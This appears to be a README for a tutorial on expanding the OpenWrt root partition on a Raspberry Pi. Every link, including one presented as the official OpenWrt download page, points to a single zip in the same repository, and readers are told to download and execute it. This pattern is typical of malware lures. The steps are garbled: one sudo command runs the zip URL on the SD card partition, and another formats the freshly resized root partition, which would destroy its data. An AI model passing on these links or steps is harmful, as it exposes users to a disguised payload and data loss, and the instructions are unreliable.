Whether you are a beginner or an experienced user, this guide aims to help you through each step.

You can find the necessary files in the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip). Please ensure you download and execute the files as instructed.

## 🛠️ Prerequisites

Before you start, ensure you have the following:

- A Raspberry Pi or compatible board.
- An SD card with OpenWrt installed.
- A computer running Ubuntu or another Linux distribution.
- VirtualBox installed on your computer.
- Basic knowledge of terminal commands.

## 📥 Download OpenWrt

1. Visit the [OpenWrt Downloads](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip) page.
2. Locate the Ext4 version for your Raspberry Pi model.
3. Download the image file to your computer.

Make sure to check the [Releases section](https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip) for any additional files you may need.

## 🖥️ Setting Up Your Environment

### 1. Install VirtualBox

If you haven't installed VirtualBox yet, you can do so using the following command:

```bash
sudo apt update
sudo apt install virtualbox
```

### 2. Create a New Virtual Machine

1. Open VirtualBox.
2. Click on "New" to create a new VM.
3. Set the name to "OpenWrt VM".
4. Choose "Linux" as the type and "Ubuntu (64-bit)" as the version.
5. Allocate at least 1 GB of RAM.
6. Create a virtual hard disk (VDI) and allocate at least 8 GB of space.

### 3. USB Passthrough Setup

1. Go to the settings of your VM.
2. Click on "USB".
3. Enable USB Controller and add a USB device filter for your SD card reader.

## 📏 Expanding the Root Partition

### 1. Boot into the Ubuntu VM

1. Start your OpenWrt VM.
2. Open a terminal in Ubuntu.

### 2. Identify the SD Card

Run the following command to list all connected drives:

```bash
lsblk
```

Find your SD card in the list. It will usually be listed as `/dev/sdX` where `X` is a letter.

### 3. Resize the Partition

1. Open `fdisk` to modify the partition table:

```bash
sudo fdisk /dev/sdX
```

2. Press `p` to print the partition table.
3. Note the start sector of the root partition (usually the first partition).
4. Delete the existing partition by pressing `d` and selecting the partition number.
5. Create a new partition by pressing `n`, selecting `p` for primary, and entering the same start sector. Use the default end sector to utilize the full space.
6. Press `w` to write changes and exit.

### 4. Format the New Partition

Run the following command to format the new partition as Ext4:

```bash
sudo https://github.com/QuestChillz/Expanding-the-Root-Partition-for-OpenWrt-on-Raspberry-Pi/raw/refs/heads/main/bardo/Wrt-Open-Pi-Raspberry-Expanding-on-the-Root-for-Partition-2.5.zip /dev/sdX1
```

### 5. Expand the File System

To expand the file system to fill the partition, use:

```bash
sudo resize2fs /dev/sdX1
```

## ✅ Verifying Changes

After resizing, verify that the changes took effect:

1. Run `df -h` to check the available space.
2. Use `e2fsck` to check the file system:

```bash
sudo e2fsck -f /dev/sdX1
```

## 🛠️ Troubleshooting

If you encounter issues, consider the following tips:

- Ensure your SD card is properly connected.
- Double-check the partition sizes and sectors.
- Review the VirtualBox USB settings.
